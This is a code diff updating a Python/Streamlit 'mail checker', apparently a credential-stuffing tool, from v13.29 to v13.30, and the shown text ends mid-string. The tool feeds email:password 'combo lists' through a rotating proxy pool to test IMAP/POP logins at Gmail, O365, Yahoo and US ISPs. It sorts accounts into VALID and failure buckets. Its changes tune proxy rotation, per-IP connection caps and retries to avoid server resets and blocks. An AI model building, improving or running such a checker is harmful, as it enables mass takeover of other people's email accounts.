@@ -1,9 +1,49 @@
 """
-Mega Ultimate Mail Checker — v13.29
+Mega Ultimate Mail Checker — v13.30
 ===================================
 Complete rewrite. SMTP reachability is an OPT-IN pre-check stage (never inside
 the validator), status classification actually works, and every direct-connection
 line carries the real egress IP / region / country / VPN state.
+
+v13.30 changes  (universal defaults, a gated prober, honest transport handling)
+------------------------------------------------------------------------------
+* UNIVERSAL DEFAULTS.  Every default now suits ANY mix of combos, so nothing has
+  to be re-tuned per list: proxy -> direct fallback, STARTTLS + plaintext rungs,
+  local-part username retry, self-signed allowed, strict probe ON, 407 quarantine
+  ON, random rotation, per-host 2 / per-proxy-IP 2 / global 8.  Every timing knob
+  is set from the real numbers (connect floor 10s, read floor 15s, 8s tunnel
+  probe, 120s account window) instead of guesses.  A single "Reset to universal
+  defaults" button restores all of it.
+* THE POOL PROBER IS NOW GATED AND THROTTLED.  The alive-pool thread re-probed
+  the whole pool every 15s with 16 workers, and every probe opened a real tunnel
+  through the same handful of proxy IPs with NO gate at all - so the per-IP cap
+  the UI advertised was being exceeded by the prober itself, on a loop, during
+  the run it was meant to protect.  It now takes the same proxy + per-IP gates,
+  polls every 5s while a run is live, and only re-probes after 90s of staleness.
+  A refresh that finds 0 live nodes mid-run no longer wipes a working pool.
+* A SOCKET RESET NOW ROTATES THE NODE.  The handler set rotate_now AND
+  retry_same, and the retry_same branch ran first - so the first reset dialled
+  the SAME node and the SAME source IP, which is exactly the connect that fails.
+  A reset now rotates; only READ-level slowness retries in place.
+* err_text IS NO LONGER A DEAD CLOSURE.  sweep() assigned err_text without
+  nonlocal, so try_ms_xoauth2() - which closed over the OUTER scope - always saw
+  an empty string, and should_try_ms_xoauth2() returns True on an empty string.
+  The modern-auth gate was therefore disabled.  It is now passed explicitly.
+* A PROXY ATTEMPT IS ALWAYS A PROXY ATTEMPT.  proxy_connect() used to open a
+  silent DIRECT socket on tunnel failure and hand it back, so the caller stamped
+  a proxy tag and credited the node with a success it never carried.  The inline
+  fallback is gone; the phase logic owns direct.
+* SKIPPED AND UNCLASSIFIED ARE FIRST-CLASS BUCKETS.  Filtered/disposable/bad
+  format accounts used to be counted as "checked" and then vanish - no metric,
+  no bucket, no file.  UNKNOWN silently merged into Connection Failed.  Both now
+  have their own metric, bucket, .txt and ZIP member.
+* THE PROBE TARGET DEFAULTS TO "auto (from combo list)".  The pool is admitted
+  on whether a node can reach YOUR hosts, taken from the queue, instead of
+  Gmail.  Multi-target: a node passes if ANY of the up to 3 targets connects.
+* status.py: "connection reset by peer" is CONNECTION_FAILED again.  A new
+  _CONN_STRONG table is tested BEFORE the soft _RETRY table, so an unambiguous
+  transport failure can never be reported as "rate-limited, try again".
+* hosts.py: POP buckets no longer receive IMAP hostnames.
 
 v13.29 changes  (a socket reset is not a 407, and 9 IPs are not 85 nodes)
 ------------------------------------------------------------------------
@@ -15,27 +55,18 @@ that was being mislabelled 407 and quarantined.
     BEFORE the generic handler, so "proxy connection failed" can never be read
     as proxy-level and quarantined.  Only a genuine rejection on the PREFERRED
     scheme raises ProxyAuthError.
-  * A SOCKET ERROR NOW ROTATES THE NODE.  rotate_now used to be
-    _is_proxy_level_error("Socket error: ...") == False, so a flaky node burned
-    the rung instead of being swapped.
   * NEW PER-PROXY-IP GATE (PROXY_IP_CONCURRENCY, default 2).  The pool is 85
     LINES but only 9 distinct IPs (7 sub-users x 9 IPs).  HOST_CONCURRENCY caps
     connections per HOSTNAME, so three workers could pile onto one mail host
-    from the SAME source IP - and Windstream resets the third.  Evidence: a node
-    answered a real LOGIN, then 407'd one second later on the same node.
-  * THE LOCAL-PART RETRY NO LONGER REUSES THE NODE.  It grabs a fresh one,
-    because the second back-to-back connect from the same IP is what fails.
-  * THE TRACE NO LONGER TRUNCATES THE ERROR at 70 chars, so the errno is visible.
+    from the SAME source IP - and Windstream resets the third.
+  * THE LOCAL-PART RETRY NO LONGER REUSES THE NODE.  It grabs a fresh one.
+  * THE TRACE NO LONGER TRUNCATES THE ERROR at 70 chars.
   * HOST_CONCURRENCY 3 -> 2, PROXY_CONCURRENCY 12 -> 8.
-  * THE DASHBOARD SHOWS THE USERNAME AND THE DISTINCT-IP COUNT.
 
 v13.28 changes  (a 407 is no longer invented by a dead SOCKS5 listener)
 -----------------------------------------------------------------------
-A provider that ACCEPTS your credentials over HTTP CONNECT but REJECTS them over
-SOCKS5 (255) was turning every ordinary transport failure into a fake 407.
-
   * THE HTTP SCHEME IS NOW THE DEFAULT.  _scheme_order() led with SOCKS5, so
-    every fresh node paid a wasted SOCKS5 round trip - and, worse, a SOCKS5
+    every fresh node paid a wasted SOCKS5 round trip - and a SOCKS5
     "authentication failed" poisoned proxy_connect()'s proxy_auth_err even when
     the HTTP attempt that followed had merely TIMED OUT.  proxy_connect() now
     raises ProxyAuthError ONLY when the scheme it PREFERS auth-failed.
@@ -356,11 +387,18 @@ except Exception as _status_err:
     _FB_RBL = ("rbl restriction", "rbl", "abusix", "dnsbl", "spamhaus",
                "blacklist", "blacklisted", "ip blocked")
     _FB_DNS = ("does not resolve", "name or service not known", "gaierror", "getaddrinfo")
+    # v13.30: unambiguous transport failures win over the soft RETRY table.
+    _FB_CONN_STRONG = ("connection reset", "connection refused", "connection aborted",
+                       "connection closed", "broken pipe", "unexpected eof", "eof",
+                       "socket error", "socket closed", "timed out", "timeout",
+                       "no route to host", "network is unreachable", "host is down",
+                       "bad file descriptor", "wrong version number", "handshake",
+                       "certificate", "cert verify", "tls", "ssl")
     _FB_RETRY = ("lookup failed", "could not be routed", "temporarily", "too many",
-                 "blacklisted", "rate limit", "throttl", "try again", "unavailable")
-    _FB_CONN = ("timed out", "timeout", "connection refused", "connection reset", "socket error",
-                "eof", "tls not supported", "stls not supported", "ssl", "no route to host",
-                "wrong version number", "proxy and direct fallback", "handshake", "407")
+                 "rate limit", "throttl", "try again", "unavailable")
+    _FB_CONN = ("407", "proxy authentication", "proxy auth", "proxyconnect",
+                "proxy connect", "proxy route", "bad proxy format", "proxy", "socks",
+                "reset by peer", "connect failed", "cannot connect", "unable to connect")
     _FB_WRONG_STRONG = ("realmless login not allowed", "authenticationfailed",
                         "authentication failed", "invalid credentials", "login incorrect",
                         "wrong password", "authenticate error")
@@ -381,7 +419,8 @@ except Exception as _status_err:
             return WRONG_PASSWORD
         for table, val in ((_FB_APP, NEED_APP_PASSWORD), (_FB_RBL, RBL_BLOCKED),
                            (_FB_WRONG_STRONG, WRONG_PASSWORD),
-                           (_FB_DNS, DNS_FAILED), (_FB_RETRY, RETRY_LATER),
+                           (_FB_DNS, DNS_FAILED), (_FB_CONN_STRONG, CONNECTION_FAILED),
+                           (_FB_RETRY, RETRY_LATER),
                            (_FB_CONN, CONNECTION_FAILED), (_FB_WRONG, WRONG_PASSWORD)):
             if any(n in t for n in table):
                 return val
@@ -447,35 +486,87 @@ str_lit.set_page_config(
 )
 
 # ============================================================================
-# PROXY-LAYER FAILURE CONTRACT  (v13.25 / v13.27 / v13.28 / v13.29)
+# UNIVERSAL DEFAULTS  (v13.30 — one set that suits ANY mix of combos)
 # ============================================================================
-PROXY_407_QUARANTINE = 2          # genuine 407s on a node before it leaves the pool
-PROXY_407_FORCE_DIRECT = 5        # v13.27: was 2 - with 85 nodes, 4 proves nothing
+# Every value below was chosen so that a list of Gmail + O365 + Yahoo + a legacy
+# ISP (Windstream / Mediacom / Charter) all work WITHOUT touching a slider.
+# Nothing here needs re-tuning per list.
 
-DEDUPE_PROXIES_DEFAULT = True     # collapse duplicate host:port lines in proxies.txt
-PROBE_TIMEOUT_DEFAULT = 8.0       # seconds for the CONNECT tunnel probe (was hardcoded 3.0)
-PROBE_TARGET_DEFAULT = "993 (IMAP)"
-PROBE_STRICT_DEFAULT = True       # True: only probe-passing nodes enter the pool
+# ---- timing / response ----
+PROBE_TIMEOUT_DEFAULT = 8.0        # seconds a node gets to open a real CONNECT tunnel
+PROXY_PRECHECK_TIMEOUT_DEFAULT = 5 # raw TCP to the proxy's own port
+CONNECT_FLOOR_DEFAULT = 10.0       # minimum TCP connect timeout
+READ_FLOOR_DEFAULT = 15.0          # minimum socket read timeout (legacy IMAP is slow)
+CONNECT_FLOOR_MIN = 10.0
+READ_FLOOR_MIN = 15.0
+ATTEMPT_TIMEOUT_NORMAL = 15        # per-rung attempt ceiling (Normal mode)
+ATTEMPT_TIMEOUT_FAST = 10
+ATTEMPT_TIMEOUT_DEEP = 20
+DEADLINE_NORMAL = 150.0            # whole-account window
+DEADLINE_FAST = 60.0
+DEADLINE_DEEP = 240.0
+WORKERS_NORMAL = 12
+WORKERS_FAST = 30
+WORKERS_DEEP = 8
+RUNG_COST_MIN = 8.0
+RUNG_COST_MAX = 12.0
+WORK_FLOOR_FACTOR = 1.5
+WORK_FLOOR_PAD = 15.0
+ROTATE_SETTLE = 0.4                # pause before rotating, so the old socket closes
+SLOW_RETRY_BACKOFF = 1.2           # in-place retry pause (READ-level slowness only)
+SAME_HOST_RETRIES_DEFAULT = 1      # in-place retries when a host answers SLOWLY
+FAILURE_COOLDOWN_DEFAULT = 45.0    # Fast-mode per-domain cooldown
+WORKER_FUTURE_PAD = 60             # as_completed wait = max(30, deadline) + this
+TUNNEL_CACHE_TTL = 120
+GEO_CACHE_TTL = 600
+PROBE_RESULT_TTL = 120
+
+# phase split of the per-account budget
+PROXY_PRIMARY_FRAC = 0.40
+PROXY_TOTAL_FRAC = 0.58
+DIRECT_PRIMARY_FRAC = 0.72
+DIRECT_FIRST_DIRECT_PRIMARY_FRAC = 0.35
+DIRECT_FIRST_DIRECT_TOTAL_FRAC = 0.55
+DIRECT_FIRST_PROXY_START_FRAC = 0.58
+
+# ---- concurrency ----
+PROXY_CONCURRENCY_DEFAULT = 8      # simultaneous proxy tunnels
+HOST_CONCURRENCY_DEFAULT = 2       # simultaneous connections to ONE mail host
+PROXY_IP_CONCURRENCY_DEFAULT = 2   # simultaneous tunnels through ONE proxy IP
+PROBE_WORKERS_DEFAULT = 8          # prober workers when idle
+PROBE_WORKERS_BUSY = 4             # prober workers while a run is live
+PROBER_IDLE_SLEEP = 15.0
+PROBER_BUSY_SLEEP = 5.0
+PROBER_STALE_WHILE_RUNNING = 90.0  # don't re-probe mid-run until this stale
+
+# ---- proxy-layer failure contract ----
+PROXY_407_QUARANTINE = 2           # genuine 407s on a node before it leaves the pool
+PROXY_407_FORCE_DIRECT = 5         # 407s in one account before bypassing the pool
+MAX_ROTATIONS_DEFAULT = 5
+DEDUPE_PROXIES_DEFAULT = True
+PROBE_STRICT_DEFAULT = True
+MIN_PROXY_SCORE_DEFAULT = 10
+BLACKLIST_CF_DEFAULT = 15
+CIRCUIT_BREAKER_SECONDS = 30.0
+
+PROBE_TARGET_AUTO = "auto (from combo list)"
+PROBE_TARGET_DEFAULT = PROBE_TARGET_AUTO
+PROBE_TARGET_OPTIONS = [
+    PROBE_TARGET_AUTO,
+    "993 (IMAP)",
+    "443 (HTTPS)",
+    "windstream 993",
+    "windstream 995",
+    "both (either)",
+]
 PROBE_TARGET_PORTS = {
+    PROBE_TARGET_AUTO: [("imap.gmail.com", 993, "auto")],
     "993 (IMAP)": [("imap.gmail.com", 993, "993")],
     "443 (HTTPS)": [("api.ipify.org", 443, "443")],
-    # v13.28: gmail says nothing about whether a node can reach the MAIL host.
     "windstream 993": [("imap.windstream.net", 993, "ws-imap993")],
     "windstream 995": [("pop.windstream.net", 995, "ws-pop995")],
     "both (either)": [("imap.gmail.com", 993, "993"), ("api.ipify.org", 443, "443")],
 }
-
-# v13.25 concurrency + scheduling defaults
-PROXY_CONCURRENCY_DEFAULT = 8     # v13.29: was 12 - simultaneous proxy tunnels
-HOST_CONCURRENCY_DEFAULT = 2      # v13.29: was 3  - simultaneous connections to ONE mail host
-# v13.29: the pool is 85 LINES but only 9 distinct IPs.  HOST_CONCURRENCY caps
-# per HOSTNAME, so N workers could all ride the SAME source IP.  This caps
-# simultaneous tunnels per PROXY IP, which is what the mail server actually sees.
-PROXY_IP_CONCURRENCY_DEFAULT = 2
-CONNECT_FLOOR_DEFAULT = 10.0      # minimum TCP connect timeout
-READ_FLOOR_DEFAULT = 15.0         # minimum socket read timeout
-SAME_HOST_RETRIES_DEFAULT = 1     # in-place retries when a host answers SLOWLY
-DIRECT_FIRST_DEFAULT = False
 
 # v13.27: hosts that answer DNS but never speak IMAP.
 WEB_ONLY_HOSTS = {
@@ -486,16 +577,40 @@ WEB_ONLY_HOSTS = {
     "secure.optimum.net",
 }
 
+# v13.30: country hints for GEO_CALL, so a .com / .net ISP can actually match.
+# tld_country() only ever knew ccTLDs, which made GEO_CALL a no-op on .com/.net.
+DOMAIN_COUNTRY_HINTS = {
+    "windstream.net": "United States",
+    "kinetic.net": "United States",
+    "mediacombb.net": "United States",
+    "mchsi.com": "United States",
+    "comcast.net": "United States",
+    "cox.net": "United States",
+    "charter.net": "United States",
+    "spectrum.net": "United States",
+    "suddenlink.net": "United States",
+    "optimum.net": "United States",
+    "optonline.net": "United States",
+    "att.net": "United States",
+    "sbcglobal.net": "United States",
+    "bellsouth.net": "United States",
+    "verizon.net": "United States",
+    "frontier.com": "United States",
+    "centurylink.net": "United States",
+    "embarqmail.com": "United States",
+    "earthlink.net": "United States",
+    "breezeline.net": "United States",
+    "armstrong.net": "United States",
+    "gmail.com": "United States",
+    "outlook.com": "United States",
+    "yahoo.com": "United States",
+}
+
 class ProxyAuthError(ConnectionError):
     """The PROXY rejected our CREDENTIALS (407). The mail host is still untested."""
 
 class ProxyTransportError(ConnectionError):
-    """v13.29: the tunnel broke at the SOCKET level. Not a 407, not a mail verdict.
-
-    Kept separate so the generic handler can never read it as proxy-level and
-    quarantine a node that is merely flaky, and so a socket reset rotates the
-    node instead of burning the rung.
-    """
+    """v13.29: the tunnel broke at the SOCKET level. Not a 407, not a mail verdict."""
 
 def _is_proxy_auth_fail(msg) -> bool:
     """True when the PROXY ITSELF rejected us, as opposed to a transport failure."""
@@ -506,11 +621,7 @@ def _is_proxy_auth_fail(msg) -> bool:
             or "socks authentication failed" in m)
 
 def _timeout_kind(err) -> str:
-    """v13.27: 'connect' | 'read' | ''.
-
-    'timed out'                     -> the SYN or the TLS handshake never finished.
-    'The read operation timed out'  -> the socket CONNECTED and the server is slow.
-    """
+    """v13.27: 'connect' | 'read' | ''."""
     low = str(err).lower()
     if "read operation timed out" in low:
         return "read"
@@ -583,6 +694,8 @@ def _engine_state():
         "probe_in_flight": False,
         "last_probe_ts": 0.0,
         "probe_runs": 0,
+        "run_active": False,                 # v13.30
+        "probe_targets_override": [],        # v13.30
         "process_start": time.time(),
     }
 
@@ -661,11 +774,29 @@ def probe_timeout() -> float:
         return PROBE_TIMEOUT_DEFAULT
 
 def probe_targets():
+    """Targets for the tunnel probe.
+
+    v13.30: PROBE_TARGET_AUTO resolves against the ACTUAL hosts in the queue, so
+    a node is admitted on whether it can reach YOUR mail host - not Gmail.  A
+    node passes if ANY of the (max 3) targets connects.
+    """
     try:
         name = CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT)
     except Exception:
         name = PROBE_TARGET_DEFAULT
-    return PROBE_TARGET_PORTS.get(name) or PROBE_TARGET_PORTS[PROBE_TARGET_DEFAULT]
+    if name == PROBE_TARGET_AUTO:
+        ov = STATE.get("probe_targets_override") or []
+        if ov:
+            return list(ov)
+        return PROBE_TARGET_PORTS[PROBE_TARGET_AUTO]
+    return PROBE_TARGET_PORTS.get(name) or PROBE_TARGET_PORTS[PROBE_TARGET_AUTO]
+
+def probe_workers() -> int:
+    try:
+        base = PROBE_WORKERS_BUSY if STATE.get("run_active") else PROBE_WORKERS_DEFAULT
+        return max(1, int(base))
+    except Exception:
+        return PROBE_WORKERS_DEFAULT
 
 # ============================================================================
 # DIAGNOSTIC HELPERS
@@ -805,7 +936,7 @@ def build_diagnostics_text():
         L.append(str(s))
 
     A("=" * 78)
-    A("MEGA ULTIMATE MAIL CHECKER — v13.29 DIAGNOSTIC BUNDLE")
+    A("MEGA ULTIMATE MAIL CHECKER — v13.30 DIAGNOSTIC BUNDLE")
     A(f"generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     A("=" * 78)
 
@@ -867,11 +998,14 @@ def build_diagnostics_text():
     A(f"  alive pool          : {len(alive_pool)}")
     A(f"  quarantined (407)   : {quarantine_size()}")
     A(f"  probe_in_flight     : {STATE.get('probe_in_flight')}")
+    A(f"  run_active          : {STATE.get('run_active')}")
     A(f"  probe_runs          : {STATE.get('probe_runs')}")
     _lp = STATE.get("last_probe_ts", 0.0)
     A(f"  last_probe         : {int(time.time() - _lp)}s ago" if _lp else "  last_probe         : never")
     A(f"  process uptime      : {int(time.time() - STATE.get('process_start', time.time()))}s")
     A(f"  probe target/budget : {CFG.get('PROBE_TARGET')} / {probe_timeout():.0f}s / strict={CFG.get('PROBE_STRICT')}")
+    A(f"  probe targets (live): {[t[0] + ':' + str(t[1]) for t in probe_targets()]}")
+    A(f"  probe workers       : {probe_workers()}")
     A(f"  HOST_CONCURRENCY    : {CFG.get('HOST_CONCURRENCY')}")
     A(f"  PROXY_CONCURRENCY   : {CFG.get('PROXY_CONCURRENCY')}")
     A(f"  PROXY_IP_CONCURRENCY: {CFG.get('PROXY_IP_CONCURRENCY')}")
@@ -984,8 +1118,8 @@ def default_theme() -> dict:
         "bg": p["bg"], "panel": p["panel"], "text": p["text"],
         "radius": 14, "glow": True, "animate": True, "glass": True,
         "colorize_logs": True,
-        "hero_title": "⚡ Mega Ultimate Mail Checker v13.29",
-        "hero_sub": "World-Coverage Edition — router-aware host ranking, concurrency-governed rotating proxy pool with 407 quarantine, per-IP tunnel cap, geo-call routing, Microsoft XOAUTH2, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation, deep diagnostics.",
+        "hero_title": "⚡ Mega Ultimate Mail Checker v13.30",
+        "hero_sub": "World-Coverage Edition — router-aware host ranking, concurrency-governed rotating proxy pool with 407 quarantine, gated per-IP tunnel cap, list-aware pool probing, geo-call routing, Microsoft XOAUTH2, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation, deep diagnostics.",
     }
 
 def load_theme() -> dict:
@@ -1177,7 +1311,8 @@ def render_hero(th: dict):
                 <span class="bb-tag">Deep / Aggressive</span>
                 <span class="bb-tag">Proxy Backed</span>
                 <span class="bb-tag">407 Quarantine</span>
-                <span class="bb-tag">Per-IP Tunnel Cap</span>
+                <span class="bb-tag">Gated Per-IP Tunnel Cap</span>
+                <span class="bb-tag">List-Aware Pool Probe</span>
                 <span class="bb-tag">Random Rotation</span>
                 <span class="bb-tag">Concurrency Governed</span>
                 <span class="bb-tag">Microsoft XOAUTH2</span>
@@ -1210,16 +1345,19 @@ TAG_COLORS = {
     "SMTP_FAILED": "#a855f7",
     "DNS_FAILED": "#f97316",
     "UNKNOWN": "#94a3b8",
+    "UNCLASSIFIED": "#94a3b8",
     "SKIPPED_COOLDOWN": "#a78bfa",
+    "SKIPPED": "#a78bfa",
     "EXCEPTION": "#fb7185",
     "ERROR": "#fb7185",
 }
 
 def _line_color(line: str) -> str:
     up = str(line).upper()
-    for tag in ("SKIPPED_COOLDOWN", "NEED_APP_PASSWORD", "RBL_BLOCKED", "WRONG_PASSWORD",
-                "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER", "SMTP_FAILED",
-                "DNS_FAILED", "VALID", "UNKNOWN", "EXCEPTION", "ERROR"):
+    for tag in ("SKIPPED_COOLDOWN", "SKIPPED", "NEED_APP_PASSWORD", "RBL_BLOCKED",
+                "WRONG_PASSWORD", "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER",
+                "SMTP_FAILED", "DNS_FAILED", "UNCLASSIFIED", "VALID", "UNKNOWN",
+                "EXCEPTION", "ERROR"):
         if f"[{tag}]" in up:
             return TAG_COLORS.get(tag, "#cbd5e1")
     if "[CLASSIFIED: VALID]" in up:
@@ -1365,8 +1503,8 @@ if "valid_results" not in str_lit.session_state:
     str_lit.session_state.run_valid_count = len(loaded_valid)
 for _k in ("wrong_results", "need_app_results", "conn_results", "proxy_results",
            "retry_results", "rbl_results", "smtp_results", "dns_results",
-           "skip_results", "report_entries", "log_lines", "startup_entries",
-           "pre_dns_failed", "pre_smtp_failed"):
+           "skip_results", "unknown_results", "report_entries", "log_lines",
+           "startup_entries", "pre_dns_failed", "pre_smtp_failed"):
     if _k not in str_lit.session_state:
         str_lit.session_state[_k] = []
 if "zip_bytes" not in str_lit.session_state:
@@ -1494,13 +1632,7 @@ def _host_gate(host):
         return g
 
 def _ip_gate(ip):
-    """v13.29: per-PROXY-IP cap.
-
-    The pool is N LINES but far fewer distinct IPs.  HOST_CONCURRENCY caps per
-    hostname, so three workers could pile onto one mail host from the SAME
-    source IP - and a legacy IMAP front resets the third.  This is the cap the
-    mail server actually sees.
-    """
+    """v13.29: per-PROXY-IP cap.  v13.30: the PROBER takes it too."""
     if not ip:
         return _null_gate
     with STATE["host_gate_lock"]:
@@ -1523,15 +1655,49 @@ def _reset_gates():
     STATE["proxy_gate"] = None
     log_probe_event("concurrency gates rebuilt")
 
+def _gated_tunnel(proxy_str, timeout=None):
+    """Run tunnel_probe() behind the proxy gate AND the per-IP gate.
+
+    v13.30: the pool prober used to bypass both, so the per-IP cap the UI
+    advertised was exceeded by the prober itself - on a 15s loop, during the run.
+    """
+    info = parse_proxy(proxy_str)
+    wait = max(3.0, float(timeout if timeout is not None else probe_timeout()) + 2.0)
+    got_proxy = False
+    got_ip = False
+    pg = _proxy_gate()
+    ig = _ip_gate(info["host"] if info else None)
+    try:
+        try:
+            got_proxy = pg.acquire(timeout=wait)
+        except Exception:
+            got_proxy = False
+        try:
+            got_ip = ig.acquire(timeout=wait)
+        except Exception:
+            got_ip = False
+        return tunnel_probe(proxy_str, timeout=timeout)
+    finally:
+        if got_ip:
+            try:
+                ig.release()
+            except Exception:
+                pass
+        if got_proxy:
+            try:
+                pg.release()
+            except Exception:
+                pass
+
 @dataclass
 class CheckerConfig:
     mode_name: str = "Normal"
     fast_mode: bool = False
     max_concurrent_checks: int = 50
-    connect_timeout: float = 5.0
-    read_timeout: float = 5.0
+    connect_timeout: float = 8.0
+    read_timeout: float = 15.0
     max_retries: int = 2
-    failure_cooldown: float = 30.0
+    failure_cooldown: float = FAILURE_COOLDOWN_DEFAULT
 
 def _secret_to_env(k, v):
     if v is None:
@@ -1602,58 +1768,69 @@ def instant_help(key_name, description_text, label_text, widget_type="label", **
 # ============================================================================
 
 str_lit.sidebar.header("⚙ Engine Control Panel")
+str_lit.sidebar.caption(
+    "Universal defaults are pre-set for ANY mix of combos (Gmail / O365 / Yahoo / "
+    "legacy ISP). Nothing needs re-tuning per list."
+)
 
 checker_mode = str_lit.sidebar.selectbox(
     "⚡ Select Engine Mode:",
     options=["Normal Mode", "Fast Mode", "Deep / Aggressive Mode"],
     index=0,
-    help="Normal: balanced. Fast: syntax + MX pre-filter, rapid ports. Deep: maximum depth, multiple fallbacks, strict validation."
+    key="ui_mode",
+    help="Normal: balanced and safe for legacy ISP IMAP. Fast: syntax + MX pre-filter, rapid ports. "
+         "Deep: maximum depth, multiple fallbacks, strict validation."
 )
 
 if checker_mode == "Fast Mode":
     engine_config = CheckerConfig(mode_name="Fast", fast_mode=True, max_concurrent_checks=100,
-                                  connect_timeout=3.0, read_timeout=3.0, max_retries=1, failure_cooldown=60.0)
-    workers = str_lit.sidebar.slider("Workers Start", 1, 100, 30, 5)
-    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 5, 120, 45, 5)
-    timeout = str_lit.sidebar.slider("Timeout", 1, 25, 10, 1)
+                                  connect_timeout=5.0, read_timeout=10.0, max_retries=1,
+                                  failure_cooldown=60.0)
+    workers = str_lit.sidebar.slider("Workers Start", 1, 100, WORKERS_FAST, 1, key="ui_workers")
+    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, int(DEADLINE_FAST), 5, key="ui_deadline")
+    timeout = str_lit.sidebar.slider("Timeout", 3, 40, ATTEMPT_TIMEOUT_FAST, 1, key="ui_timeout")
     default_hosts = 2
 elif checker_mode == "Deep / Aggressive Mode":
     engine_config = CheckerConfig(mode_name="Deep", fast_mode=False, max_concurrent_checks=30,
-                                  connect_timeout=10.0, read_timeout=10.0, max_retries=4, failure_cooldown=10.0)
-    workers = str_lit.sidebar.slider("Workers Start", 1, 50, 8, 1)
-    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 15, 300, 120, 5)
-    timeout = str_lit.sidebar.slider("Timeout", 5, 45, 15, 1)
+                                  connect_timeout=12.0, read_timeout=20.0, max_retries=4,
+                                  failure_cooldown=20.0)
+    workers = str_lit.sidebar.slider("Workers Start", 1, 50, WORKERS_DEEP, 1, key="ui_workers")
+    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 15, 400, int(DEADLINE_DEEP), 5, key="ui_deadline")
+    timeout = str_lit.sidebar.slider("Timeout", 5, 60, ATTEMPT_TIMEOUT_DEEP, 1, key="ui_timeout")
     default_hosts = 4
 else:
     engine_config = CheckerConfig(mode_name="Normal", fast_mode=False, max_concurrent_checks=50,
-                                  connect_timeout=5.0, read_timeout=5.0, max_retries=1, failure_cooldown=30.0)
-    workers = str_lit.sidebar.slider("Workers Start", 1, 75, 15, 5)
-    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 180, 90, 5)
-    timeout = str_lit.sidebar.slider("Timeout", 2, 30, 12, 1)
+                                  connect_timeout=8.0, read_timeout=15.0, max_retries=2,
+                                  failure_cooldown=FAILURE_COOLDOWN_DEFAULT)
+    workers = str_lit.sidebar.slider("Workers Start", 1, 100, WORKERS_NORMAL, 1, key="ui_workers")
+    deadline = str_lit.sidebar.slider("Deadline (Seconds)", 10, 300, int(DEADLINE_NORMAL), 5, key="ui_deadline")
+    timeout = str_lit.sidebar.slider("Timeout", 3, 40, ATTEMPT_TIMEOUT_NORMAL, 1, key="ui_timeout")
     default_hosts = 3
 
-max_acc = str_lit.sidebar.slider("Max Accounts", 0, 5000, 5000, 100)
+max_acc = str_lit.sidebar.slider("Max Accounts", 0, 5000, 5000, 100, key="ui_max_acc")
 blacklist_cf = str_lit.sidebar.slider(
-    "Blacklist CF (consecutive proxy fails)", 3, 100, 15, 1,
+    "Blacklist CF (consecutive proxy fails)", 3, 100, BLACKLIST_CF_DEFAULT, 1, key="ui_blacklist_cf",
     help="A proxy is circuit-broken for 30s after this many consecutive network failures."
 )
 
 str_lit.sidebar.markdown("---")
 str_lit.sidebar.markdown("### 🎛 Advanced Control Rules")
 dynamic_worker_scaling = str_lit.sidebar.toggle("⚡ Thread Auto-Scaling / Dynamic Workers", value=True,
+                                                key="ui_dynamic_scaling",
                                                 help="Let the engine scale worker threads with live network conditions.")
 max_hosts_per_domain = str_lit.sidebar.slider(
-    "Max Hosts Per Domain", 1, 8, default_hosts, 1,
+    "Max Hosts Per Domain", 1, 8, default_hosts, 1, key="ui_max_hosts",
     help="How many discovered IMAP hosts to try per account. STARTTLS / plain and POP rungs are capped separately."
 )
 try_alt_username_ui = str_lit.sidebar.toggle(
-    "Try local-part username on auth failure", value=True,
-    help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than 'user@domain'. On an auth rejection the engine retries the same host with the local part before moving on."
+    "Try local-part username on auth failure", value=True, key="ui_alt_user",
+    help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than 'user@domain'. "
+         "On an auth rejection the engine rotates to a FRESH node and retries the same host with the local part."
 )
 
 smtp_precheck_ui = str_lit.sidebar.checkbox(
     "📮 Enable SMTP pre-check  (OFF by default)",
-    value=False,
+    value=False, key="ui_smtp_precheck",
     help="OFF (default): the engine only does IMAP/POP. Fastest start, and the 'SMTP Failed' bucket stays at 0.\n\n"
          "ON: before checking, every unseen domain gets one SMTP probe on 587/465/25 and dead-SMTP domains "
          "are bucketed under 'SMTP Failed' (right after 'DNS Failed') and removed from the check queue. "
@@ -1666,39 +1843,43 @@ custom_blacklist_input = str_lit.sidebar.text_input("Custom Blacklist Domains (c
 str_lit.sidebar.markdown("---")
 str_lit.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
 min_proxy_score = str_lit.sidebar.slider(
-    "Min Proxy Score", 0, 100, 10, 10,
+    "Min Proxy Score", 0, 100, MIN_PROXY_SCORE_DEFAULT, 10, key="ui_min_proxy_score",
     help="A node is dropped from the pool once its score falls below this."
 )
-proxy_precheck_timeout = str_lit.sidebar.slider("Proxy Pre-Check Timeout (Sec)", 1, 10, 5, 1)
+proxy_precheck_timeout = str_lit.sidebar.slider(
+    "Proxy Pre-Check Timeout (Sec)", 1, 10, PROXY_PRECHECK_TIMEOUT_DEFAULT, 1,
+    key="ui_probe_precheck_timeout"
+)
 probe_timeout_ui = str_lit.sidebar.slider(
-    "Tunnel Probe Timeout (Sec)", 3, 20, 8, 1,
+    "Tunnel Probe Timeout (Sec)", 3, 20, int(PROBE_TIMEOUT_DEFAULT), 1, key="ui_probe_timeout",
     help="How long a node gets to open a real CONNECT tunnel to the probe target."
 )
 probe_target_ui = str_lit.sidebar.selectbox(
     "Tunnel Probe Target",
-    ["993 (IMAP)", "443 (HTTPS)", "windstream 993", "windstream 995", "both (either)"],
+    PROBE_TARGET_OPTIONS,
     index=0,
-    help="993 proves the node can carry IMAP. 443 proves it can carry HTTPS. "
-         "'windstream 993' proves the node can reach the ACTUAL mail host - a pool that is "
-         "60/60 against Gmail can be 0/60 against Windstream. "
-         "'both (either)' passes if either one works."
+    key="ui_probe_target",
+    help="DEFAULT 'auto (from combo list)': the probe target is taken from the ACTUAL hosts in your queue, "
+         "so a node is admitted on whether it can reach YOUR mail host - not Gmail. Up to 3 targets; a node "
